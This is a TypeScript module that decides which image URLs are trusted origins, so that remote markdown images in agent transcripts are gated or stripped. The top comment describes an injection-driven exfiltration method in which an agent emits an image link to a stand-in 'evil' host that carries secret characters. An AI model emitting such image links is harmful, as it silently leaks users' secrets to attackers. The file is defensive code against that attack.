// The one definition of "an image src that reaches no third party".
//
// A markdown image auto-loads the instant it renders: the browser GETs the src
// with no click. That is a silent exfiltration channel — an attacker who gets
// an agent to emit ![x](https://evil/px?c=<secret>) (one signed pixel per
// secret character) beacons data out to teammates and to public share-link
// visitors with zero interaction (the EchoLeak / CamoLeak class).
//
// Our own web origin and our Convex storage origin (where pasted/uploaded
// transcript images and `cast image` uploads live) are not third parties: a
// GET there leaks viewer IP and timing only to our own infrastructure. Those
// render immediately; every other http(s) origin is untrusted and callers gate
// it behind an explicit click (MarkdownRenderer) or strip it (canvasSanitize).
//
// Computed lazily, not at module init: window must exist (SSR, tests), and
// tests stub VITE_CONVEX_URL before importing this module.
//
// The Convex origin comes from the shared CONVEX_URL constant, never from the
// raw env var: the env var is unset in production builds, and reading it here
// dead-code-eliminated the Convex origin from the trust set — which gated
// every image in our own storage behind click-to-load.

import { getConvexUrl } from "./convexUrl";

let trustedOrigins: Set<string> | null = null;

export function getTrustedImageOrigins(): Set<string> {
  if (trustedOrigins) return trustedOrigins;
  const origins = new Set<string>();
  try { origins.add(window.location.origin); } catch { /* non-browser */ }
  try { origins.add(new URL(getConvexUrl()).origin); } catch { /* malformed */ }
  trustedOrigins = origins;
  return origins;
}

/** True when src points at a third-party http(s) host — the class the
 *  auto-fetch gate exists for. data:/blob:/relative/trusted-origin srcs are
 *  not remote in this sense. */
export function isRemoteImageSrc(src: string): boolean {
  // Inline data / local object URLs never touch a third party.
  if (/^(data:|blob:)/i.test(src)) return false;
  // Relative or root-relative path — resolves against our own origin. A
  // protocol-relative "//host/…" has no scheme but IS remote, so let it fall
  // through to URL parsing below.
  if (!/^[a-z][a-z0-9+.-]*:/i.test(src) && !src.startsWith('//')) return false;
  try {
    const url = new URL(src, window.location.href);
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return false;
    return !getTrustedImageOrigins().has(url.origin);
  } catch {
    return true; // unparseable absolute reference → treat as untrusted
  }
}

/** Strict form for sanitizer contexts (cast-canvas): data: URIs and absolute
 *  http(s) URLs on a trusted origin only — no relative paths, no blob:, so the
 *  allowed set stays auditable without a resolution step. */
export function isTrustedAbsoluteImageSrc(src: string): boolean {
  if (src.startsWith("data:")) return true;
  try {
    const url = new URL(src); // absolute only — no base
    if (url.protocol !== "http:" && url.protocol !== "https:") return false;
    return getTrustedImageOrigins().has(url.origin);
  } catch {
    return false;
  }
}
